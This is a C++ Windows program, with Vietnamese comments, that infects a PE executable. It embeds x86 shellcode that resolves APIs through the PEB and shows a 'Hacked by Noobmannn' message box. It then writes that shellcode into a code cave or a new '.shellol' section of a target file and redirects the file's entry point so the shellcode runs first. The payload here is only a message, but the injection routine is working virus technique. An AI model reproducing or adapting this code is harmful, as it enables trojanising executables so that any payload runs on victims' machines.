#include <iostream>
#include <stdio.h>
#include <windows.h>
#define MAX 500


unsigned char shellcode[] = { 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x28, 0xE8, 0x0D, 0x00, 0x00,
  0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x61,
  0x72, 0x79, 0x41, 0x00, 0xE8, 0x79, 0x01, 0x00, 0x00, 0x89,
  0x45, 0xFC, 0xE8, 0x0F, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74,
  0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73,
  0x73, 0x00, 0xE8, 0x5D, 0x01, 0x00, 0x00, 0x89, 0x45, 0xF8,
  0x33, 0xC0, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x55, 0x73, 0x65,
  0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x8B, 0x45,
  0xFC, 0xFF, 0xD0, 0x89, 0x45, 0xF4, 0x33, 0xC0, 0x33, 0xDB,
  0xE8, 0x0C, 0x00, 0x00, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61,
  0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00, 0x8B, 0x45, 0xF8,
  0x8B, 0x5D, 0xF4, 0x53, 0xFF, 0xD0, 0x89, 0x45, 0xF0, 0x33,
  0xC0, 0x33, 0xDB, 0xE8, 0x0D, 0x00, 0x00, 0x00, 0x4B, 0x65,
  0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C,
  0x00, 0x8B, 0x45, 0xFC, 0xFF, 0xD0, 0x89, 0x45, 0xEC, 0x33,
  0xC0, 0x33, 0xDB, 0xE8, 0x11, 0x00, 0x00, 0x00, 0x47, 0x65,
  0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E,
  0x64, 0x6C, 0x65, 0x57, 0x00, 0x8B, 0x45, 0xF8, 0x8B, 0x5D,
  0xEC, 0x53, 0xFF, 0xD0, 0x89, 0x45, 0xE8, 0x33, 0xC0, 0x33,
  0xDB, 0xE8, 0x12, 0x00, 0x00, 0x00, 0x47, 0x65, 0x74, 0x43,
  0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63,
  0x65, 0x73, 0x73, 0x00, 0x8B, 0x45, 0xF8, 0x8B, 0x5D, 0xEC,
  0x53, 0xFF, 0xD0, 0x89, 0x45, 0xE4, 0x33, 0xC0, 0x33, 0xDB,
  0xE8, 0x18, 0x00, 0x00, 0x00, 0x4B, 0x33, 0x32, 0x47, 0x65,
  0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x49, 0x6E, 0x66,
  0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x8B,
  0x45, 0xF8, 0x8B, 0x5D, 0xEC, 0x53, 0xFF, 0xD0, 0x89, 0x45,
  0xE0, 0x33, 0xC0, 0x33, 0xDB, 0xE8, 0x0B, 0x00, 0x00, 0x00,
  0x57, 0x41, 0x52, 0x4E, 0x49, 0x4E, 0x47, 0x21, 0x21, 0x21,
  0x00, 0x5E, 0xE8, 0x17, 0x00, 0x00, 0x00, 0x48, 0x61, 0x63,
  0x6B, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4E, 0x6F, 0x6F,
  0x62, 0x6D, 0x61, 0x6E, 0x6E, 0x6E, 0x21, 0x21, 0x21, 0x00,
  0x5F, 0x33, 0xC0, 0x8B, 0x45, 0xF0, 0x33, 0xDB, 0x53, 0x56,
  0x57, 0x53, 0xFF, 0xD0, 0x33, 0xC0, 0x33, 0xDB, 0x33, 0xC9,
  0x33, 0xD2, 0x33, 0xF6, 0x33, 0xFF, 0x8B, 0x45, 0xE8, 0x6A,
  0x00, 0xFF, 0xD0, 0x89, 0x45, 0xDC, 0x33, 0xC0, 0x8B, 0x45,
  0xE4, 0xFF, 0xD0, 0x8B, 0xF0, 0x8B, 0x7D, 0xDC, 0x33, 0xC0,
  0x33, 0xC9, 0x89, 0x4D, 0xD8, 0x8D, 0x4D, 0xD8, 0x8B, 0x45,
  0xE0, 0x6A, 0x0C, 0x51, 0x57, 0x56, 0xFF, 0xD0, 0x33, 0xC0,
  0x8B, 0x45, 0xD8, 0x05, 0xAA, 0xAA, 0xAA, 0xAA, 0x83, 0xC4,
  0x28, 0x8B, 0xE5, 0x5D, 0x50, 0xC3, 0x55, 0x8B, 0xEC, 0x83,
  0xEC, 0x14, 0x33, 0xC0, 0x89, 0x45, 0xFC, 0x89, 0x45, 0xF8,
  0x89, 0x45, 0xF4, 0x89, 0x45, 0xF0, 0x89, 0x45, 0xEC, 0x64,
  0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40,
  0x14, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40, 0x10, 0x8B, 0xD8,
  0x8B, 0x43, 0x3C, 0x03, 0xC3, 0x8B, 0x40, 0x78, 0x03, 0xC3,
  0x8B, 0x48, 0x14, 0x89, 0x4D, 0xFC, 0x8B, 0x48, 0x1C, 0x03,
  0xCB, 0x89, 0x4D, 0xF8, 0x8B, 0x48, 0x20, 0x03, 0xCB, 0x89,
  0x4D, 0xF4, 0x8B, 0x48, 0x24, 0x03, 0xCB, 0x89, 0x4D, 0xF0,
  0x33, 0xC0, 0x33, 0xC9, 0x8B, 0x75, 0x08, 0x8B, 0x7D, 0xF4,
  0xFC, 0x8B, 0x3C, 0x87, 0x03, 0xFB, 0x66, 0xB9, 0x08, 0x00,
  0xF3, 0xA6, 0x74, 0x06, 0x40, 0x3B, 0x45, 0xFC, 0x75, 0xE6,
  0x8B, 0x4D, 0xF0, 0x8B, 0x55, 0xF8, 0x66, 0x8B, 0x04, 0x41,
  0x8B, 0x04, 0x82, 0x03, 0xC3, 0x83, 0xC4, 0x14, 0x8B, 0xE5,
  0x5D, 0xC3
};

void infected(char* lpTargetFile) {
	// Đọc File PE mục tiêu
	HANDLE hFile = CreateFileA(lpTargetFile, FILE_READ_ACCESS | FILE_WRITE_ACCESS, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwFileSize = GetFileSize(hFile, NULL);
	HANDLE hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, NULL, dwFileSize, NULL);
	LPBYTE lpFileAddr = (LPBYTE)MapViewOfFile(hFileMapping, FILE_MAP_READ | FILE_MAP_WRITE, NULL, NULL, dwFileSize);

	// Thay đổi push 0xAAAAAAAA thành push dwOEP để đảm bảo sau khi chạy xong Shellcode sẽ quay về chạy tiếp code của file mục tiêu
	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpFileAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpFileAddr + pDosHdr->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
	DWORD dwOEP = pNtHdrs->OptionalHeader.AddressOfEntryPoint;
	DWORD dwShellcodeSize = sizeof(shellcode);
	for (DWORD i = 0; i < dwShellcodeSize; i++) {
		if (*(LPDWORD)(shellcode + i) == 0xAAAAAAAA) {
			*(LPDWORD)(shellcode + i) = dwOEP;
			break;
		}
	}

	// Biến chứa địa chỉ Shellcode
	LPVOID lpShellAddr = 0;

	// Tìm Codecave
	DWORD dwCnt = 0;
	DWORD dwPos;
	for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
		for (dwPos = pSecHdr->PointerToRawData; dwPos < (pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData); dwPos++) {
			if (*(lpFileAddr + dwPos) == 0x00) {
				if (dwCnt++ == dwShellcodeSize) {
					dwPos -= dwShellcodeSize;
					lpShellAddr = (LPVOID)(lpFileAddr + dwPos);
					printf("[+] Fine Codecave in Section: %s\n", pSecHdr->Name);
					break;
				}
			}
			else {
				dwCnt = 0;
			}
		}
		if (lpShellAddr) {
			break;
		}
		dwCnt = 0;
		pSecHdr++;
	}

	// Thêm Section
	DWORD dwNewSecRVA = 0;
	DWORD dwNewSecRaw = 0;
	if (!lpShellAddr) {
		pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
		for (int i = 0; i < pNtHdrs->FileHeader.NumberOfSections - 1; i++) {
			pSecHdr++;
		}
		dwNewSecRaw = pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData;
		pSecHdr++;
		pNtHdrs->FileHeader.NumberOfSections++;
		strncpy((char*)pSecHdr->Name, ".shellol", IMAGE_SIZEOF_SHORT_NAME);
		pNtHdrs->OptionalHeader.SizeOfImage += pNtHdrs->OptionalHeader.SectionAlignment;
		pSecHdr->SizeOfRawData = pNtHdrs->OptionalHeader.FileAlignment * ((dwShellcodeSize / pNtHdrs->OptionalHeader.FileAlignment) + 1);
		pSecHdr->Misc.VirtualSize = 0;
		pSecHdr->PointerToRawData = dwNewSecRaw;
		pSecHdr->VirtualAddress = (pNtHdrs->FileHeader.NumberOfSections) * pNtHdrs->OptionalHeader.SectionAlignment;
		SetFilePointer(hFile, dwNewSecRaw, NULL, FILE_BEGIN);
		BYTE* buffer = (BYTE*)malloc(pSecHdr->SizeOfRawData);
		memset(buffer, 0x00, pSecHdr->SizeOfRawData);
		DWORD byteWritten;
		WriteFile(hFile, buffer, pSecHdr->SizeOfRawData, &byteWritten, NULL);
		lpShellAddr = (LPVOID)(lpFileAddr + dwNewSecRaw);
		dwPos = dwNewSecRaw;
		printf("[+] Add New Section: %s\n", pSecHdr->Name);
	}

	// Chèn Shellcode vào;
	memcpy(lpShellAddr, shellcode, dwShellcodeSize);

	// Tinh chỉnh lại file PE
	pSecHdr->Misc.VirtualSize += dwShellcodeSize;
	pSecHdr->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	pNtHdrs->OptionalHeader.AddressOfEntryPoint = dwPos + pSecHdr->VirtualAddress - pSecHdr->PointerToRawData;
}

int main(int argc, char* argv[])
{
	char* pPath = new char[MAX_PATH];
	GetModuleFileNameA(0, pPath, MAX_PATH);
	pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
	strcat(pPath, "TestingFile.exe");
	infected(pPath);
	return 0;
}
